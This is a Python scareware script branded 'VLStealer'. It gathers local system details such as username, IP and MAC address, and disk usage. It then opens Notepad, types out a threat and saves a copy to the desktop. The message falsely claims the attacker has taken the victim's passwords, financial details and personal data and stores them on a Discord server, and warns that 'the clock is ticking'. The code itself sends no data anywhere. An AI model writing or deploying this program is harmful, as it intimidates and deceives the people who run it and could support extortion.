import os
import time
import pyautogui
import platform
import socket
import psutil
import math

class NotepadWriter:
    def __init__(self, text, wait_time=2):
        self.text = text
        self.wait_time = wait_time

    def open_notepad_and_write(self):
        try:
            os.system("start notepad.exe")
            time.sleep(self.wait_time)
            pyautogui.typewrite(self.text)
        except Exception:
            print(f"")

def get_system_info():
    user = os.getenv("USERNAME")
    computer_name = os.getenv("COMPUTERNAME")
    os_info = platform.platform()
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = get_mac_address()
    last_login = get_last_login()
    
    system_architecture = platform.architecture()[0]  
    python_version = platform.python_version() 
    disk_usage = psutil.disk_usage('/')  
    total_disk_space = convert_bytes(disk_usage.total)  
    used_disk_space = convert_bytes(disk_usage.used)  
    free_disk_space = convert_bytes(disk_usage.free) 

    return {
        "user": user,
        "computer_name": computer_name,
        "os_info": os_info,
        "ip_address": ip_address,
        "mac_address": mac_address,
        "last_login": last_login,
        "system_architecture": system_architecture,
        "python_version": python_version,
        "total_disk_space": total_disk_space,
        "used_disk_space": used_disk_space,
        "free_disk_space": free_disk_space
    }

def get_mac_address():
    if os.name == 'nt':
        return os.popen("getmac").read().strip().split()[0]
    else:
        return os.popen("ifconfig | grep ether").read().strip().split()[1]

def get_last_login():
    if os.name == 'nt':
        return os.popen('whoami /user').read().strip()
    else:
        return os.popen('last -1').read().strip()

def convert_bytes(size):
    if size == 0:
        return "0 GB"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.log(size, 1024))  
    p = math.pow(1024, i)
    return f"{size/p:.2f} {size_name[i]}"

def create_info_message(system_info):
    return f"""
+ Hello {system_info['user']},

+ We have successfully infiltrated your system and gathered all your personal information. 
+ Your full name, address, phone number, email, 
+ and even sensitive financial details are now in our possession. 
+ Every action you take online leaves an indelible trace.

+=============================================================+
+ WE HAVE ALL UR PASSWORD AND ALL UR DATA IN OUR DISCORD SERVER
+=============================================================+
+ Username: {system_info['user']}                               
+ Computer Name: {system_info['computer_name']}                 
+ Operating System: {system_info['os_info']}                    
+ IP Address: {system_info['ip_address']}                       
+ MAC Address: {system_info['mac_address']}                     
+ Last Login: {system_info['last_login']}                       
+ System Architecture: {system_info['system_architecture']}     
+ Python Version: {system_info['python_version']}               
+ Total Disk Space: {system_info['total_disk_space']}           
+ Used Disk Space: {system_info['used_disk_space']}             
+ Free Disk Space: {system_info['free_disk_space']}             
+=============================================================+
+ You have been warned. The clock is ticking.                                       
+ Best regards, VLStealer.   
+ Your PC is now infected by VLStealer. Have a good day.                                  
+=============================================================+
"""

def save_to_file(message, filename="VLStealer.txt"):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    full_path = os.path.join(desktop_path, filename)
    try:
        with open(full_path, 'w') as file:
            file.write(message)
        print(f"")
    except Exception:
        print(f"")

if __name__ == "__main__":
    system_info = get_system_info()
    warning_message = create_info_message(system_info)
    
    notepad_writer = NotepadWriter(warning_message)
    notepad_writer.open_notepad_and_write()
    
    save_to_file(warning_message)  
